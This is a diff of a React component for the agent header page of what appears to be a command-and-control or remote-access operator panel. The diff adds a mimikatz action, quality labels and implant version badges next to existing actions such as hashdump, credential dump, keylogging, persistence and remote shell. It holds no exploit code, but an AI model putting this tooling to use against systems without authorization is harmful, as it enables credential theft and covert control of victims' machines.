@@ -3,13 +3,25 @@
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import Link from "next/link";
-import { CopyButton, StatusBadge, Spinner } from "@/components/UI";
+import { CopyButton } from "@/components/ui/copy-button";
+import { StatusBadge } from "@/components/ui/status-indicator";
+import { Spinner } from "@/components/ui/spinner";
 import type { AgentDetail, AgentStatus } from "@/types/agent";
 import { Activity, Apple, Camera, Clipboard, Crown, Database, FolderOpen, Key, Keyboard, Link as LinkIcon, ListChecks, MapPin, Monitor, MoreHorizontal, RefreshCw, Shield, Skull, SlidersHorizontal, Terminal, Trash2 } from "lucide-react";
 import { Badge } from "@/components/ui/badge";
 import { DropdownMenu, DropdownMenuTrigger, DropdownMenuContent, DropdownMenuItem, DropdownMenuSeparator } from "@/components/ui/dropdown-menu";
 import { Tooltip, TooltipContent, TooltipTrigger } from "@/components/ui/tooltip";
 import { useI18n } from "@/lib/i18n";
+import { isExperimentalDesktop, sessionActionQuality, type SessionActionQuality } from "./session-quality";
+import { implantBlocksDest, knownImplantVersion } from "../../_components/implant-version";
+
+function QualityMark({ quality }: { quality: SessionActionQuality }) {
+  const { t } = useI18n();
+  if (quality === "core") return <>{t("generate.quality_core")}</>;
+  if (quality === "hardened") return <>{t("generate.quality_hardened")}</>;
+  if (quality === "experimental") return <>{t("generate.quality_experimental")}</>;
+  return <>{t("cred.quality_scripted")}</>;
+}
 
 function getOSIcon(os: string): React.ReactNode {
   const cls = "w-7 h-7 text-primary";
@@ -29,6 +41,7 @@ export interface AgentHeaderProps {
   actionLoading: string | null;
   onQuickAction: (action: string, label: string) => void;
   credCount: number | null;
+  mimikatzReady?: boolean;
   onKill: () => void;
   onUninstall: () => void;
   onMigrate?: () => void;
@@ -37,7 +50,7 @@ export interface AgentHeaderProps {
 
 export default function AgentHeader({
   agent, agentId, status,
-  actionLoading, onQuickAction, credCount, onKill, onUninstall, onMigrate,
+  actionLoading, onQuickAction, credCount, mimikatzReady = false, onKill, onUninstall, onMigrate,
 }: AgentHeaderProps) {
   const { t } = useI18n();
   const hostname = agent.hostname || "\u2014";
@@ -51,12 +64,14 @@ export default function AgentHeader({
   const domain = agent.domain || "";
   const country = agent.country || "";
   const city = agent.city || "";
+  const version = knownImplantVersion(agent.version);
 
   const quickActions = [
     { action: "screenshot", label: t("agents.header_screenshot"), icon: <Camera className="w-5 h-5" /> },
     { action: "ps", label: t("agents.header_processes"), icon: <ListChecks className="w-5 h-5" /> },
-    { action: "hashdump", label: t("agents.header_hashdump"), icon: <Database className="w-5 h-5" /> },
-    { action: "creds_dump", label: t("agents.header_creds_dump"), icon: <Database className="w-5 h-5" />, badge: credCount },
+    { action: "hashdump", label: t("agents.header_hashdump"), icon: <Database className="w-5 h-5" />, quality: "scripted" as const },
+    { action: "creds_dump", label: t("agents.header_creds_dump"), icon: <Database className="w-5 h-5" />, badge: credCount, quality: "scripted" as const },
+    { action: "mimikatz", label: t("agents.header_mimikatz"), icon: <Key className="w-5 h-5" />, quality: "scripted" as const, needsModule: true },
     { action: "clipboard_get", label: t("agents.header_clipboard"), icon: <Clipboard className="w-5 h-5" /> },
     { action: "privesc_check", label: t("agents.header_privesc"), icon: <Shield className="w-5 h-5" /> },
     { action: "keylogger_start", label: t("agents.header_key_start"), icon: <Terminal className="w-5 h-5" /> },
@@ -67,7 +82,7 @@ export default function AgentHeader({
   return (
     <>
       <Card className="mb-4 overflow-hidden border-border/70 bg-card/90 shadow-sm">
-        <div className="h-1 w-full bg-gradient-to-r from-primary via-cyan-500 to-emerald-500" />
+        <div className="h-1 w-full bg-gradient-to-r from-primary via-chart-2 to-chart-1" />
         <div className="p-4 sm:p-5">
           <div className="flex flex-col gap-4 xl:flex-row xl:items-start xl:justify-between">
             <div className="flex min-w-0 flex-1 items-start gap-4">
@@ -89,6 +104,13 @@ export default function AgentHeader({
                     <Badge variant="warning" className="text-(--fs-micro-sm)">
                       <Crown className="w-4 h-4" />
                       {t("agents.header_elevated")}
+                    </Badge>
+                  )}
+                  {version ? (
+                    <Badge variant="outline" className="font-mono text-(--fs-micro-sm)">{version}</Badge>
+                  ) : (
+                    <Badge variant="warning" className="text-(--fs-micro-sm)" title={t("agents.version_unknown_hint")}>
+                      {t("agents.version_unknown")}
                     </Badge>
                   )}
                 </div>
@@ -131,13 +153,24 @@ export default function AgentHeader({
             <div className="grid grid-cols-2 gap-2 sm:grid-cols-4 xl:w-[34rem]">
               <Button variant="outline" size="sm" render={<Link href={`/agents/${agentId}/shell`} />}><Terminal className="w-4 h-4" /> {t("agents.shell_title")} <kbd className="text-(--fs-micro-sm) opacity-50 ml-1">S</kbd></Button>
               <Button variant="outline" size="sm" render={<Link href={`/agents/${agentId}/files`} />}><FolderOpen className="w-4 h-4" /> {t("agents.files_title")} <kbd className="text-(--fs-micro-sm) opacity-50 ml-1">F</kbd></Button>
-              <Button variant="outline" size="sm" render={<Link href={`/agents/${agentId}/screen`} />}><Monitor className="w-4 h-4" /> {t("agents.screen_title")} <kbd className="text-(--fs-micro-sm) opacity-50 ml-1">D</kbd></Button>
+              <Button variant="outline" size="sm" render={<Link href={`/agents/${agentId}/screen`} />}><Monitor className="w-4 h-4" /> {t("agents.screen_title")} <span className="text-(--fs-micro) opacity-70"><QualityMark quality="hardened" /></span> <kbd className="text-(--fs-micro-sm) opacity-50 ml-1">D</kbd></Button>
               <DropdownMenu>
                 <DropdownMenuTrigger render={<Button variant="secondary" size="sm" className="gap-1.5"><MoreHorizontal className="w-4 h-4" /> {t("agents.header_more")}</Button>} />
                 <DropdownMenuContent className="w-48">
-                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/token`} />}><Key className="w-4 h-4" /> {t("agents.token_title")}</DropdownMenuItem>
-                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/persistence`} />}><LinkIcon className="w-4 h-4" /> {t("agents.persistence_title")}</DropdownMenuItem>
-                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/remote-desktop`} />}><Monitor className="w-4 h-4" /> {t("agents.rdp_title")}</DropdownMenuItem>
+                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/token`} />}>
+                    <Key className="w-4 h-4" /> {t("agents.token_title")}
+                    <span className="ml-auto text-(--fs-micro) text-muted-foreground"><QualityMark quality="hardened" /></span>
+                  </DropdownMenuItem>
+                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/persistence`} />}>
+                    <LinkIcon className="w-4 h-4" /> {t("agents.persistence_title")}
+                    <span className="ml-auto text-(--fs-micro) text-muted-foreground"><QualityMark quality="hardened" /></span>
+                  </DropdownMenuItem>
+                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/remote-desktop`} />}>
+                    <Monitor className="w-4 h-4" /> {t("agents.rdp_title")}
+                    {isExperimentalDesktop("remote-desktop") ? (
+                      <span className="ml-auto text-(--fs-micro) text-warning"><QualityMark quality="experimental" /></span>
+                    ) : null}
+                  </DropdownMenuItem>
                   <DropdownMenuItem render={<Link href={`/agents/${agentId}/config`} />}><SlidersHorizontal className="w-4 h-4" /> {t("agents.config_hot_config")}</DropdownMenuItem>
                   <DropdownMenuItem render={<Link href={`/agents/${agentId}/traffic`} />}><Activity className="w-4 h-4" /> {t("agents.traffic_title")}</DropdownMenuItem>
                   {onMigrate && (
@@ -154,27 +187,46 @@ export default function AgentHeader({
       </Card>
 
       <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2 mb-4">
-        {quickActions.map((item) => (
+        {quickActions.map((item) => {
+          const blocked = "needsModule" in item && item.needsModule && !mimikatzReady;
+          const quality = sessionActionQuality(item.action);
+          const versionBlocked = implantBlocksDest(agent.version, quality);
+          const disabled = status !== "online" || actionLoading !== null || blocked || versionBlocked;
+          return (
           <Tooltip key={item.action}>
             <TooltipTrigger render={
               <Button
                 variant="ghost"
-                disabled={status !== "online" || actionLoading !== null}
+                disabled={disabled}
                 onClick={() => onQuickAction(item.action, item.label)}
-                className={`group relative overflow-hidden rounded-xl border border-border/70 bg-card/90 p-3.5 flex flex-col items-center gap-2.5 text-center transition-all duration-200 hover:-translate-y-0.5 hover:shadow-lg hover:border-primary/20 ${status !== "online" || actionLoading !== null ? "opacity-40" : ""}`}
+                className={`group relative overflow-hidden rounded-xl border border-border/70 bg-card/90 p-3.5 flex flex-col items-center gap-2.5 text-center transition-all duration-200 hover:-translate-y-0.5 hover:shadow-lg hover:border-primary/20 ${disabled ? "opacity-40" : ""}`}
               />
             }>
               <span className="flex h-9 w-9 items-center justify-center rounded-full bg-primary/10 text-primary transition-transform group-hover:scale-105">
                 {actionLoading === item.action ? <Spinner size="sm" /> : item.icon}
               </span>
               <span className="text-(--fs-micro-sm) font-medium text-foreground leading-tight text-center">{item.label}</span>
+              {quality && quality !== "core" && (
+                <span className={quality === "scripted" || quality === "experimental" ? "text-(--fs-micro) text-warning" : "text-(--fs-micro) text-muted-foreground"}>
+                  <QualityMark quality={quality} />
+                </span>
+              )}
               {"badge" in item && item.badge != null && (item.badge as number) > 0 && (
                 <Badge className="absolute top-1 right-1 min-w-[16px] h-4 px-1 text-(--fs-micro-sm)">{(item.badge as number) > 99 ? "99+" : (item.badge as number)}</Badge>
               )}
             </TooltipTrigger>
-            <TooltipContent>{item.label}</TooltipContent>
+            <TooltipContent>
+              {blocked
+                ? t("cred.missing_module")
+                : versionBlocked
+                  ? t("agents.version_unknown_dest")
+                : item.action === "privesc_check"
+                  ? t("agents.header_privesc_hint")
+                  : item.label}
+            </TooltipContent>
           </Tooltip>
-        ))}
+          );
+        })}
       </div>
     </>
   );
